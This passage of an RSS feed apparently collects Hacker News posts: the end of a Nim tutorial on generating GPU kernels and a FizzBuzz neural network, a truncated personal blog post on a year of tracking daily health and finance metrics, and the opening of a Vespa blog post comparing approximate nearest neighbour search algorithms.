  __device__ __forceinline__ void operator()(
      T *  __restrict__ dst,
      const T *  __restrict__ A,
      const T *  __restrict__ B){
      *dst = __ldg(A)"""</span><span>,</span> <span>op_symbol</span><span>,</span> <span>""" __ldg(B);
      }
  };
  """</span><span>]</span><span>.</span><span>}</span></pre><p>You can see here the advantage of C++: <tt><span>typename T</span></tt> to template over int/float/double and higher-order functions/function object for cleaner code. You can also see that Nim can directly inline C++ code with <tt><span>emit</span></tt> and I even templatize the operation_name.</p>
<p>Now what about OpenCL? Unfortunately C doesn’t offer something similar and requires a lot of boilerplate. The alternative, the C++ official OpenCL API and implementation: SYCL is very experimental and I am not sure how it works on actual GPUs.</p>
<p>However thanks to Nim metaprogramming, squashing the C boilerplate is super easy. Here is an example kernel to do C = A op B</p>
<pre><span>template</span> <span>gen_cl_apply3</span><span>*</span><span>(</span><span>kern_name</span><span>,</span> <span>ctype</span><span>,</span> <span>op</span><span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>=</span>
  
  
  
  
  
  
  
  <span>opencl_getIndexOfElementID</span><span>(</span><span>)</span> <span>&amp;</span> <span>"""
  __kernel
  void """</span> <span>&amp;</span> <span>kern_name</span> <span>&amp;</span>
          <span>"""(const int rank,
              const int len,
              __global const int * restrict dst_shape,
              __global const int * restrict dst_strides,
              const int dst_offset,
              __global       """</span> <span>&amp;</span> <span>ctype</span> <span>&amp;</span> <span>""" * restrict const dst_data,
              __global const int * restrict A_shape,
              __global const int * restrict A_strides,
              const int A_offset,
              __global const """</span> <span>&amp;</span> <span>ctype</span> <span>&amp;</span> <span>""" * restrict const A_data,
              __global const int * restrict B_shape,
              __global const int * restrict B_strides,
              const int B_offset,
              __global const """</span> <span>&amp;</span> <span>ctype</span> <span>&amp;</span> <span>""" * restrict const B_data)
  {
    // Grid-stride loop
    for (int elemID = get_global_id(0);
    elemID &lt; len;
    elemID += get_global_size(0)) {
      const int dst_real_idx = opencl_getIndexOfElementID(rank, dst_shape, dst_strides, dst_offset, elemID);
      const int A_real_idx = opencl_getIndexOfElementID(rank, A_shape, A_strides, A_offset, elemID);
      const int B_real_idx = opencl_getIndexOfElementID(rank, B_shape, B_strides, B_offset, elemID);
      
      dst_data[dst_real_idx] = A_data[A_real_idx] """</span> <span>&amp;</span> <span>op</span> <span>&amp;</span> <span>""" B_data[B_real_idx];
    }
  }
  """</span></pre><p>And write a few generic lines of code to deal with the data on the device (especially <tt><span>opencl_getIndexOfElementID</span></tt> which convert <tt><span>foo[1, 2, 3]</span></tt> into <tt><span>foo.data[456]</span></tt> depending on the tensor shape.</p>
<p>Afterwards, all my operations are easily added in one line:</p>
<ul><li>kind of function (infix: C = A op B or in-place A += B or A *= B)</li>
<li>Nim type</li>
<li>C type</li>
<li>Nim operator (for operator overloading)</li>
<li>OpenCL kernel name</li>
<li>OpenCL operation</li>
</ul>
<pre><span>genClInfixOp</span><span>(</span><span>float32</span><span>,</span> <span>"float"</span><span>,</span> <span>`</span><span>+</span><span>`</span><span>,</span> <span>"clAdd"</span><span>,</span> <span>"+"</span><span>)</span>
<span>genClInfixOp</span><span>(</span><span>float64</span><span>,</span> <span>"double"</span><span>,</span> <span>`</span><span>+</span><span>`</span><span>,</span> <span>"clAdd"</span><span>,</span> <span>"+"</span><span>)</span>
<span>genClInfixOp</span><span>(</span><span>float32</span><span>,</span> <span>"float"</span><span>,</span> <span>`</span><span>-</span><span>`</span><span>,</span> <span>"clSub"</span><span>,</span> <span>"-"</span><span>)</span>
<span>genClInfixOp</span><span>(</span><span>float64</span><span>,</span> <span>"double"</span><span>,</span> <span>`</span><span>-</span><span>`</span><span>,</span> <span>"clSub"</span><span>,</span> <span>"-"</span><span>)</span>

<span>genClInPlaceOp</span><span>(</span><span>float32</span><span>,</span> <span>"float"</span><span>,</span> <span>`</span><span>+=</span><span>`</span><span>,</span> <span>"clAdd"</span><span>,</span> <span>"+="</span><span>)</span>
<span>genClInPlaceOp</span><span>(</span><span>float64</span><span>,</span> <span>"double"</span><span>,</span> <span>`</span><span>+=</span><span>`</span><span>,</span> <span>"clAdd"</span><span>,</span> <span>"+="</span><span>)</span>
<span>genClInPlaceOp</span><span>(</span><span>float32</span><span>,</span> <span>"float"</span><span>,</span> <span>`</span><span>-=</span><span>`</span><span>,</span> <span>"clSub"</span><span>,</span> <span>"-="</span><span>)</span>
<span>genClInPlaceOp</span><span>(</span><span>float64</span><span>,</span> <span>"double"</span><span>,</span> <span>`</span><span>-=</span><span>`</span><span>,</span> <span>"clSub"</span><span>,</span> <span>"-="</span><span>)</span></pre><p>Next steps? Create unary operation higher-order functions and add cos/sin/ln/exp in just 2 lines of code each. Furthermore allow lifting any unary operation to operations on whole tensors with a map function, expose it so that OpenCL tensors are easily customizable.</p>
<p>After using Nim + OpenCL, I actually realized that using C++ function objects was overengineering.</p>
<p>To conclude, at the moment, I am convinced that the best language to work with GPUs is Nim.</p>
<p>Oh, and for those who wants to see real Nim code for neural networks, here is a Fizzbuzz in Nim using neural networks (I didn’t implement it on GPU yet though)</p>
<pre>









<span>import</span> <span>../</span><span>src</span><span>/</span><span>arraymancer</span><span>,</span> <span>math</span><span>,</span> <span>strformat</span>




<span>func</span> <span>binary_encode</span><span>(</span><span>i</span><span>:</span> <span>int</span><span>,</span> <span>num_digits</span><span>:</span> <span>int</span><span>)</span><span>:</span> <span>Tensor</span><span>[</span><span>float32</span><span>]</span> <span>=</span>
  <span>result</span> <span>=</span> <span>newTensor</span><span>[</span><span>float32</span><span>]</span><span>(</span><span>1</span><span>,</span> <span>num_digits</span><span>)</span>
  <span>for</span> <span>d</span> <span>in</span> <span>0</span> <span>..&lt;</span> <span>num_digits</span><span>:</span>
    <span>result</span><span>[</span><span>0</span><span>,</span> <span>d</span><span>]</span> <span>=</span> <span>float32</span><span>(</span><span>i</span> <span>shr</span> <span>d</span> <span>and</span> <span>1</span><span>)</span>


<span>func</span> <span>fizz_buzz_encode</span><span>(</span><span>i</span><span>:</span> <span>int</span><span>)</span><span>:</span> <span>int</span> <span>=</span>
  <span>if</span>   <span>i</span> <span>mod</span> <span>15</span> <span>==</span> <span>0</span><span>:</span> <span>return</span> <span>3</span> 
  <span>elif</span> <span>i</span> <span>mod</span>  <span>5</span> <span>==</span> <span>0</span><span>:</span> <span>return</span> <span>2</span> 
  <span>elif</span> <span>i</span> <span>mod</span>  <span>3</span> <span>==</span> <span>0</span><span>:</span> <span>return</span> <span>1</span> 
  <span>else</span>              <span>:</span> <span>return</span> <span>0</span>




<span>const</span> <span>NumDigits</span> <span>=</span> <span>10</span>

<span>var</span> <span>x_train</span> <span>=</span> <span>newTensor</span><span>[</span><span>float32</span><span>]</span><span>(</span><span>2</span><span>^</span><span>NumDigits</span> <span>-</span> <span>101</span><span>,</span> <span>NumDigits</span><span>)</span>
<span>var</span> <span>y_train</span> <span>=</span> <span>newTensor</span><span>[</span><span>int</span><span>]</span><span>(</span><span>2</span><span>^</span><span>NumDigits</span> <span>-</span> <span>101</span><span>)</span>

<span>for</span> <span>i</span> <span>in</span> <span>101</span> <span>..&lt;</span> <span>2</span><span>^</span><span>NumDigits</span><span>:</span>
  <span>x_train</span><span>[</span><span>i</span> <span>-</span> <span>101</span><span>,</span> <span>_</span><span>]</span> <span>=</span> <span>binary_encode</span><span>(</span><span>i</span><span>,</span> <span>NumDigits</span><span>)</span>
  <span>y_train</span><span>[</span><span>i</span> <span>-</span> <span>101</span><span>]</span> <span>=</span> <span>fizz_buzz_encode</span><span>(</span><span>i</span><span>)</span>


<span>const</span> <span>NumHidden</span> <span>=</span> <span>100</span>


<span>let</span>
  <span>ctx</span> <span>=</span> <span>newContext</span> <span>Tensor</span><span>[</span><span>float32</span><span>]</span>
  <span>X</span>   <span>=</span> <span>ctx</span><span>.</span><span>variable</span> <span>x_train</span>

<span>network</span> <span>ctx</span><span>,</span> <span>FizzBuzzNet</span><span>:</span>
  <span>layers</span><span>:</span>
    <span>hidden</span><span>:</span> <span>Linear</span><span>(</span><span>NumDigits</span><span>,</span> <span>NumHidden</span><span>)</span>
    <span>output</span><span>:</span> <span>Linear</span><span>(</span><span>NumHidden</span><span>,</span> <span>4</span><span>)</span>
  <span>forward</span> <span>x</span><span>:</span>
    <span>x</span><span>.</span><span>hidden</span><span>.</span><span>relu</span><span>.</span><span>output</span>

<span>let</span> <span>model</span> <span>=</span> <span>ctx</span><span>.</span><span>init</span><span>(</span><span>FizzBuzzNet</span><span>)</span>
<span>let</span> <span>optim</span> <span>=</span> <span>model</span><span>.</span><span>optimizerSGD</span><span>(</span><span>0.05'f32</span><span>)</span>

<span>func</span> <span>fizz_buzz</span><span>(</span><span>i</span><span>:</span> <span>int</span><span>,</span> <span>prediction</span><span>:</span> <span>int</span><span>)</span><span>:</span> <span>string</span> <span>=</span>
  <span>[</span><span>$</span><span>i</span><span>,</span> <span>"fizz"</span><span>,</span> <span>"buzz"</span><span>,</span> <span>"fizzbuzz"</span><span>]</span><span>[</span><span>prediction</span><span>]</span>


<span>const</span> <span>BatchSize</span> <span>=</span> <span>128</span>
<span>const</span> <span>Epochs</span>    <span>=</span> <span>2500</span>


<span>for</span> <span>epoch</span> <span>in</span> <span>0</span> <span>..&lt;</span> <span>Epochs</span><span>:</span>
  
  <span>for</span> <span>start_batch</span> <span>in</span> <span>countup</span><span>(</span><span>0</span><span>,</span> <span>x_train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span><span>-</span><span>1</span><span>,</span> <span>BatchSize</span><span>)</span><span>:</span>
    
    
    <span>let</span> <span>end_batch</span> <span>=</span> <span>min</span><span>(</span><span>x_train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span><span>-</span><span>1</span><span>,</span> <span>start_batch</span> <span>+</span> <span>BatchSize</span><span>)</span>
    <span>let</span> <span>X_batch</span> <span>=</span> <span>X</span><span>[</span><span>start_batch</span> <span>..&lt;</span> <span>end_batch</span><span>,</span> <span>_</span><span>]</span>
    <span>let</span> <span>target</span> <span>=</span> <span>y_train</span><span>[</span><span>start_batch</span> <span>..&lt;</span> <span>end_batch</span><span>]</span>
    
    
    <span>let</span> <span>clf</span> <span>=</span> <span>model</span><span>.</span><span>forward</span><span>(</span><span>X_batch</span><span>)</span>
    
    
    <span>let</span> <span>loss</span> <span>=</span> <span>clf</span><span>.</span><span>sparse_softmax_cross_entropy</span><span>(</span><span>target</span><span>)</span>
    
    
    <span>loss</span><span>.</span><span>backprop</span><span>(</span><span>)</span>
    <span>optim</span><span>.</span><span>update</span><span>(</span><span>)</span>
  
  
  <span>ctx</span><span>.</span><span>no_grad_mode</span><span>:</span>
    <span>echo</span> <span>&amp;</span><span>"</span><span>\n</span><span>Epoch #{epoch} done. Testing accuracy"</span>
    
    <span>let</span> <span>y_pred</span> <span>=</span> <span>model</span>
                  <span>.</span><span>forward</span><span>(</span><span>X</span><span>)</span>
                  <span>.</span><span>value</span>
                  <span>.</span><span>softmax</span>
                  <span>.</span><span>argmax</span><span>(</span><span>axis</span> <span>=</span> <span>1</span><span>)</span>
                  <span>.</span><span>squeeze</span>
    
    <span>let</span> <span>score</span> <span>=</span> <span>y_pred</span><span>.</span><span>accuracy_score</span><span>(</span><span>y_train</span><span>)</span>
    <span>echo</span> <span>&amp;</span><span>"Accuracy: {score:.3f}%"</span>
    <span>echo</span> <span>"</span><span>\n</span><span>"</span>





<span>var</span> <span>x_buzz</span> <span>=</span> <span>newTensor</span><span>[</span><span>float32</span><span>]</span><span>(</span><span>100</span><span>,</span> <span>NumDigits</span><span>)</span>
<span>for</span> <span>i</span> <span>in</span> <span>1</span> <span>..</span> <span>100</span><span>:</span>
  <span>x_buzz</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>,</span> <span>_</span><span>]</span> <span>=</span> <span>binary_encode</span><span>(</span><span>i</span><span>,</span> <span>NumDigits</span><span>)</span>


<span>let</span> <span>X_buzz</span> <span>=</span> <span>ctx</span><span>.</span><span>variable</span> <span>x_buzz</span>


<span>ctx</span><span>.</span><span>no_grad_mode</span><span>:</span>
  <span>let</span> <span>y_buzz</span> <span>=</span> <span>model</span>
                <span>.</span><span>forward</span><span>(</span><span>X_buzz</span><span>)</span>
                <span>.</span><span>value</span>
                <span>.</span><span>softmax</span>
                <span>.</span><span>argmax</span><span>(</span><span>axis</span> <span>=</span> <span>1</span><span>)</span>
                <span>.</span><span>squeeze</span>


<span>var</span> <span>answer</span><span>:</span> <span>seq</span><span>[</span><span>string</span><span>]</span> <span>=</span> <span>@</span><span>[</span><span>]</span>

<span>for</span> <span>i</span> <span>in</span> <span>1.</span><span>.</span><span>100</span><span>:</span>
  <span>answer</span><span>.</span><span>add</span> <span>fizz_buzz</span><span>(</span><span>i</span><span>,</span> <span>y_buzz</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>]</span><span>)</span>

<span>echo</span> <span>answer</span>











</pre><p>Thank you for your attention and your support,</p>
<p>Be sure to try <a href="https://nim-lang.org/">Nim</a> and <a href="https://github.com/mratsim/Arraymancer">Arraymancer</a>! </p>



    <div>
      <p><span></span>
        <br>
        <small>Made with Nim. Generated: 2020-04-19 14:11:50 UTC</small>
      </p>
    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://mratsim.github.io/Arraymancer/uth.opencl_cuda_nim.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23707978</guid>
            <pubDate>Wed, 01 Jul 2020 23:14:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What I Learned from a Year of Daily Metrics]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23707709">thread link</a>) | @mlacks
<br/>
July 1, 2020 | http://www.erickarjaluoto.com/blog/what-i-learned-from-a-year-of-daily-metrics/ | <a href="https://web.archive.org/web/*/http://www.erickarjaluoto.com/blog/what-i-learned-from-a-year-of-daily-metrics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
	<div>
<div id="post-4557">
    <p>Monday, March 02, 2020</p>
    
    <h4>TL;DR: By documenting key metrics, I came to better understand the consequences of my actions. I also gained an appreciation for the power of habits and persistence.</h4>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<p><em>“Commit to documenting it—no matter what.”</em> That’s the deal I made with myself in late 2018. I agreed that I’d collect the data—be it good or bad. Equally important: I made no commitment to take any other action. I figured that by keeping this simple, I had little excuse to not stick with it. Soon, it also spurred action.</p>
<h2>The tools</h2>
<p>You can collect personal metrics with many tools. The following are the ones I use.</p>
<ul>
<li>Calorie counting on iOS and web app: myfitnesspal </li>
<li>Physical data (heart rate, activity, sleep): Garmin Fenix 5X</li>
<li>Weight, body fat, BMI: Fitbit Aria</li>
<li>Metrics documentation: Numbers spreadsheet </li>
</ul>
<p>These tools aren’t perfect, but they aren’t bad, either. Myfitnesspal contains a lot of inaccurate calorie counts. This requires me to compare items/sources. Wrist-based heart rate tracking also isn’t super-accurate. That said, it’s more convenient than pairing with a chest strap.</p>
<p>Data-syncing can be clumsy. For example, my scale doesn’t talk to Garmin Connect. Still, I want accurate weight data in there for calculating exertion. So, I manually insert my weight into Garmin Connect, each morning.</p>
<p>I also started collecting all my data in Google Sheets. Displaying this data got sluggish, though. This led me to switch to Numbers, which I find snappier.</p>
<p>I also created some workflows in Alfred to speed up the process. Now, I type “gar” into Alfred to rapidly open Garmin Connect for pulling data. I do the same with myfitnesspal, Stripe, and Google Analytics. (I know I could import this data automatically, but have my reasons for not doing so. I’ll get to these in a moment.)</p>
<h2>What I measure</h2>
<p>Since starting I’ve changed which metrics I collect. For the most part, though, they sort into a few key groupings. These are:</p>
<ul>
<li>Activity (daily pushups and situps, stretching, exercise)</li>
<li>Condition (ARHR, sleep, VO2m, weight, trajectory)</li>
<li>Nutrition (meal quality, fasting, calories in/out, deficit)</li>
<li>Personal habits (reading to kids; alcohol intake)</li>
<li>Revenue (passive, billings, 30-day averages)</li>
<li>Startup activity (installs, MRR, outreach, traffic)</li>
</ul>
<p>Each day gets one row, with a column for each of the items noted above. I also keep one cell for notes. Most times this is empty but does come in handy at times. For example, if I’m away from home, I’ll use my most recent 7-day weight average. I then write: “Away; weight estimated” in the Notes cell. </p>
<h2>Observations</h2>
<p>This experience might be the longest personal experiment I’ve ever undertaken. Over the year, I learned a lot from it and collected some notes. The following are ones that stand out. I’ll return to this list and add to it, should other points come to mind.</p>
<h3>One habit leads</h3>
<p>For me, collecting metrics is a keystone habit (Charles Duhigg talks about this in <em>The Power of Habit</em>). So, I document metrics near the beginning of each day. I seldom miss a day. In the odd case that I do, I’m ill-at-ease until I’ve filled in those cells.</p>
<p>This is telling. Metrics are in part about establishing positive habits and removing negative ones. For me, this makes measuring my habits my most important habit—and I stick to it.</p>
<h3>Manual matters</h3>
<p>My first successful metrics experience related to finances. Ours weren’t where they should be, so I set aside a weekend (~4 years ago) to create a better system. I collected every expense from the previous 6 months, sorted them into groups, and averaged them. This allowed me to see our monthly expenditures. It also helped me predict costs for upcoming months.</p>
<p>This resulted in a finances spreadsheet. Every day, I manually document our bank and credit card transactions in it. Every month, I copy-and-paste the monthly template for the next month. This process allows me to track our accounts for anomalies. It helps me spot potential shortfalls. It also indicates when I can set aside surplus funds for savings.</p>
<p>Could I automate most of this with personal finance software? Yes. But, it’d distance me from the process. That extra step of documenting expenses manually only adds a few minutes to my day. In exchange for that time I gain a sense of control that I value. </p>
<p>This approach also allows for customization. For example, I fill cells with positive actions (going for a run) or key milestones (a new MRR record) in green. This sounds trivial, but it’s not. These act like gold stars and provide tiny dopamine hits that affect my behavior.</p>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<h3>I can predict the future</h3>
<p>Much like I can predict our finances by documenting patterns, I can do so with personal matters. I once wrote that you <a href="http://www.erickarjaluoto.com/blog/why-you-shouldnt-step-on-the-scale/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">shouldn’t step on the scale</a>. I was wrong. A better position would have been: Don’t let today’s measurement derail your progress.</p>
<p>My weight fluctuates up to five pounds over 24 hours. This is in part because I practice alternate-day <a href="http://www.erickarjaluoto.com/blog/i-lost-one-pound-for-every-year-of-my-life/" target="_blank" rel="noreferrer noopener" aria-label="fasting (opens in a new tab)">fasting</a>. (I recognize that fasting seems extreme to some, but I find it manageable and productive.) Daily scale readings aren’t that informative. So, I tally the last week’s readings and divide the sum by 7. Doing so gives me my 7-day average. From this I see a pattern.</p>
<p>So long as I practice the same behaviors, my weight tends to follow a clear trajectory. This also allows me to calculate daily average weight loss. From this, I can extrapolate my approximate weight a week, month, or 6 months down the road. This isn’t an exact science, but it is quite useful.</p>
<h3>Data doesn’t lie (sort of)</h3>
<p>Last fall my weight loss hit a standstill. This frustrated me. Around the same time, a friend noted that weight loss involves plateaus. (I also found mention of this on Reddit.) So, I shrugged my shoulders and thought to myself, “I’ve plateaued. I guess this is as far as I go.”</p>
<p>A few weeks later, though, I took a closer look at my metrics. It turned out that I had gotten a little lax about food intake. In fact, I was up by around 500 calories a day. This wasn’t enough for me to put on weight—but it also wasn’t enough for me to drop weight.</p>
<p>I don’t want you to think that I’m obsessed with weight loss. Yet, it’s a useful way to examine how habits and tracking work—because it allows me to measure outcomes so easily.</p>
<p>We often make up reasons for why something doesn’t work. Data helps me overcome these preconceptions. It also sets me up to better assess what’s actually happening.</p>
<h3>Measurement spurs action</h3>
<p>I make a point of implementing a couple of small rituals aimed at creating more time with my kids. One is a nightly bedtime story. The problem is that by 9:00 PM, I’m beat. This leads me to put off reading, reasoning that we can do it the next night. The next night is often the same.</p>
<p>I know the boys are getting old for bedtime stories. I’m glad they take part in them now but recognize they won’t for much longer. So, I track each night I read to them. Doing so is a small act, but it serves as a daily reminder about whether I’m making time for something that matters. The longer I track such things, the more I tend to see my behavior shift. </p>
<h3>Streaks have limits</h3>
<p>A lot of folks believe in the power of streaks. This practice involves setting a habit and tracking its completion each day. Most times folks use a streaks tool or calendar to do this. The plan is to create a habit by not breaking the streak. I like this idea but it doesn’t work for me.</p>
<p>My problem with streaks is that breaking one is demoralizing. It is so much so that it stops me from starting another. I felt this most after 104 days of abstaining from alcohol. We were at a fundraiser, and I thought ”I’ve been good. Why not treat myself to a glass of wine?” The next day, I had to start my count again from 1. Bummer! Actually, more than that—I felt like I had thrown away all that discipline.</p>
<p>So, I adapted streaks to work better for me. Now, I track every day I don’t drink over the year. This means that if I slip one day, it’s OK. I haven’t lost my count for the year. I enjoy the break and start again the next day. This reduces the sense of failure and lowers the emotional cost of restarting.</p>
<h3>Exercise works faster than I expected</h3>
<p>I always figured that you needed to do a lot of exercise before you saw results. To my surprise, I found the opposite this year. For example, a week of short runs every morning can drop my average resting heart rate (ARHR) by 10 beats a minute. On a bit longer of a timeline, I saw my VO2 max increase by 15% over six months with moderate activity.</p>
<p>These aren’t super-impressive numbers. Yet, they make me optimistic about how much I could achieve if I applied myself. I’m also quite excited by the gains I saw by adding a small amount of interval training. This seemed to pay off within only days.</p>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/skipped-user-testing.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/skipped-user-testing.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/skipped-user-testing-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/skipped-user-testing-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/skipped-user-testing-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/skipped-user-testing-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<h3>Metrics evolve</h3>
<p>I started out thinking that my metrics collection method needed to be perfect. In fact, this idea got in the way of me starting. Turns out it’s not the case. The act of collecting metrics is the important part. Once you start you can retool as you see what works or doesn’t.</p>
<p>For example, I tracked daily steps for a long time. I didn’t find this information that useful (because it doesn’t accommodate my cycling or skiing.) I also tried to make a habit of cold showers and drinking matcha tea. Neither of these stuck either—so, I removed them.</p>
<p>I figure it’s reasonable for a document like this to evolve. I do version the file when I make significant changes, though. This allows me to roll it back if I change my mind.</p>
<h3>Persistent action delivers</h3>
<p>Collecting metrics taught me that small matters add up to significant outcomes. These are for both the better and for the worse. You don’t put on weight through one night of binging. You do so with just one beer a night.</p>
<p>Think of this way: On a sedentary day, I burn ~2,200 calories. That’s not a lot. If I manage to stay under that number and add one beer a day, I’ll quickly find the number on my scale moving upward. But, removing 200 calories from my allotment of 2,200 has the opposite …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.erickarjaluoto.com/blog/what-i-learned-from-a-year-of-daily-metrics/">http://www.erickarjaluoto.com/blog/what-i-learned-from-a-year-of-daily-metrics/</a></em></p>]]>
            </description>
            <link>http://www.erickarjaluoto.com/blog/what-i-learned-from-a-year-of-daily-metrics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23707709</guid>
            <pubDate>Wed, 01 Jul 2020 22:44:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating an Approximate Nearest Neighbor Search]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23706731">thread link</a>) | @bratao
<br/>
July 1, 2020 | https://blog.vespa.ai/approximate-nearest-neighbor-search-in-vespa-part-1/ | <a href="https://web.archive.org/web/*/https://blog.vespa.ai/approximate-nearest-neighbor-search-in-vespa-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <!-- Toc if any -->
                
                    
                    
                
                <!-- End Toc -->
                <p>Searching for the nearest neighbors of a data point in a high dimensional vector space is an important problem for many real-time applications.
For example, in Computer Vision it can be used to find similar images in large image datasets.
In Information Retrieval, pre-trained text embeddings can be used to match documents based on the distance between query and document embeddings.
In many of these applications,
the document corpus is constantly evolving and the search is constrained by query filters applied on the metadata of the data points.
For example, in E-commerce,
a nearest neighbor search for products in a vector space would typically be constrained by product metadata like inventory status and price.</p>

<p><a href="https://vespa.ai/">Vespa</a> (the open source big data serving engine) already supports exact
<a href="https://docs.vespa.ai/documentation/nearest-neighbor-search.html">nearest neighbor search</a>
that is integrated with the Vespa query tree and its filter support.
This enables you to get the exact nearest neighbors meeting the filter criterias of the query.
This works well when the number of documents to calculate nearest neighbors for is small,
e.g when the query filter is strong, or the document corpus is small.
However, as the number of documents to consider increases, we want to trade exactness for performance and we need an approximate solution.</p>

<p>This blog post is part 1 in a series of blog posts where we share how the Vespa team implemented an approximate nearest neighbor (ANN) search algorithm.
In this first post, we’ll explain why we selected HNSW (Hierarchical Navigable Small World Graphs)
as the baseline algorithm and how we extended it to meet the requirements for integration in Vespa.
Requirements included supporting real-time updates, integration with the Vespa query tree, and being flexible enough to fit a wide range of use cases.</p>

<h2 id="requirements--challenges">Requirements &amp; Challenges</h2>
<p><a href="https://vespa.ai/">Vespa</a> is an open source real-time big data serving engine.
In a typical application, the document corpus is constantly evolving.
New documents are added and removed, and metadata is being updated.
A typical use case is news article search and recommendation, keeping a week, month or year’s worth of articles,
continually adding or updating new articles while selectively removing the oldest ones.
In this case, nearest neighbor search over pre-trained text embeddings could be used in combination with query filters over metadata.</p>

<p>Based on the existing functionality and flexibility of Vespa,
we defined a set of requirements an ANN search algorithm had to support to be a good fit for integration:</p>
<ul>
  <li>Indexes used in the algorithm must be real-time updateable with low latency and high throughput.
Data points can be added, updated and removed, and the entire corpus should not be needed when creating the index.</li>
  <li>Concurrent querying with low latency and high throughput without huge performance impact due to ongoing update operations.</li>
  <li>Seamless integration with the Vespa query tree and its filter support.
This enables correct results, compared to just increasing top K for the nearest neighbor search algorithm to compensate when query filters are used.</li>
</ul>

<h2 id="algorithms-background">Algorithms Background</h2>
<p>There exists a lot of algorithms for ANN search.
Many of these are summarized and analyzed in
<a href="https://arxiv.org/abs/1610.02455">Approximate Nearest Neighbor Search on High Dimensional Data — Experiments, Analyses, and Improvement (v1.0)</a>
and
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
In addition, benchmark results for different algorithms over different datasets are summarized in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>.</p>

<p>Existing algorithms are mainly focused on a stable document corpus where all data points in the vector space are known up front.
In this case the index structure is built once, and then used for nearest neighbor searches.
To support real-time updates, we looked for algorithms that were either incremental in nature or could be modified to meet this requirement.</p>

<p>There are three broad categories of algorithms: tree-based, graph-based and hash-based.
We choose one from each category for a more detailed exploration.
This selection was based on how they performed in benchmarks within papers and in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
and how easy the algorithm was to modify to fit our requirements.</p>

<p>We ended up with the following:</p>
<ul>
  <li><strong>Annoy</strong><br>
Annoy is tree-based and described in
<a href="https://erikbern.com/2015/10/01/nearest-neighbors-and-vector-models-part-2-how-to-search-in-high-dimensional-spaces.html">Nearest neighbors and vector models – part 2 – algorithms and data structures</a>.
It takes a straightforward engineering approach to the ANN problem, and is quite easy to understand and implement.
An Annoy index consists of N binary trees, where each tree partitions the vector space using random hyperplanes at each node in the tree.
The implementation is available on <a href="https://github.com/spotify/annoy">github</a>.</li>
  <li><strong>HNSW - Hierarchical Navigable Small World Graphs</strong><br>
This is graph-based and described in
<a href="https://arxiv.org/abs/1603.09320">Efficient and robust approximate nearest neighbor search using Hierarchical Navigable Small World graphs</a>.
HNSW builds a hierarchical graph incrementally,
and has great search performance with high recall, motivating us to prototype it for comparison.
Each node in the graph represents a point in the vector space, and nodes are linked to other nodes that are close in space.
The implementation is available on <a href="https://github.com/nmslib/hnswlib">github</a>.</li>
  <li><strong>RPLSH - Random Projection based Locality Sensitive Hashing</strong><br>
This is hash-based and described in
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
The implementation is available on <a href="https://github.com/ZJULearning/RPLSH">github</a>.
Since the random hyperplanes used for projections can be selected up-front
(only depending on the number of dimensions of the vector space) this approach is data-independent.
For our purposes, we could use the hash value as a filter,
where only documents having most bits in common with the hash value of the query data point would be considered for full distance computation.
This would give us very little extra memory and CPU usage and would be easy to fit into our exact (brute-force) nearest neighbor feature.
It was the first algorithm that we implemented as a prototype.
However, in our prototype we found that getting a significant speedup required a large sacrifice of quality.
For more info, see <em>Dropping RPLSH</em> below.</li>
</ul>

<p>We created prototype implementations of the three algorithms in C++.
This gave us a deeper understanding and the ability to make necessary modifications to support real-time updates and query filters.
The prototypes were also used to do low-level benchmarking and quality testing.</p>

<h2 id="prototype-benchmark">Prototype Benchmark</h2>
